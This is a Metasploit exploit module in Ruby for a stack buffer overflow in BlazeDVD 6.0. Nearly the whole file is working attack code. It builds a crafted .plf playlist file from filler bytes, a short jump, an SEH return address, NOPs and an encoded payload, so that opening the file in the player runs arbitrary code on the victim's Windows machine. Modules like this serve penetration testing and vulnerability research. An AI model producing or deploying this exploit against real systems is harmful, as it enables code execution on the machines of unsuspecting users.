##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/projects/Framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote

include Msf::Exploit::FILEFORMAT

def initialize(info = {})
super(update_info(info,
'Name' => 'BlazeDVD 6.0 PLF Buffer Overflow',
'Description' => %q{
This module exploits a stack over flow in BlazeDVD 6.0.
When
the application is used to open a specially crafted plf
file,
a buffer is overwritten allowing for the execution of
arbitrary code.
Set the EXITFUNC to seh or thread for best results.
},
'License' => MSF_LICENSE,
'Author' => [ 'Blake' ],
'Version' => '$Revision 1$',
'References' =>
[
[ 'EDB-ID' , '13998' ],
[ 'BID', '35918' ],
],
'DefaultOptions' =>
{
'EXITFUNC' => 'process',
},
'Payload' =>
{
'Space' => 1363,
'BadChars' => "\x00\x0a\x0d",
'DisableNops' => 'True',
},
'Platform' => 'win',
'Targets' =>
[
[ 'BlazeDVD 6.0 Universal', { 'Ret' => 0x6033077D } ],
],
'Privileged' => false,
'DisclosureDate' => 'June 23, 2010',
'DefaultTarget' => 0))

register_options(
[
OptString.new('FILENAME', [ false,
'The file name.', 'msf.plf']),
], self.class)

end

def exploit

plf = rand_text_alphanumeric(608)
plf << "\xeb\x06\x90\x90"
plf << [target.ret].pack('V')
plf << make_nops(20)
plf << payload.encoded
plf << rand_text_alphanumeric(1364 - payload.encoded.length)

print_status("Creating '#{datastore['FILENAME']}' file ...")

file_create(plf)

end

end